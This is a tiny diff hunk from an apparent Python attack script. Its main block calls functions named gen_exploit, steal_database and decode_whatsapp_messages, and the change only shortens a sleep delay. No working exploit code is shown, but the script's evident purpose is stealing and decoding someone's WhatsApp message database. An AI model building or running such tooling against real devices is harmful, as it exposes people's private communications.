@@ -84,7 +84,7 @@ def connect_to_db(filepath):
 if __name__ == "__main__":
     gen_exploit.gen_exploit()
     steal_database()
-    time.sleep(10)
+    time.sleep(5)
     decode_whatsapp_messages()
  
    
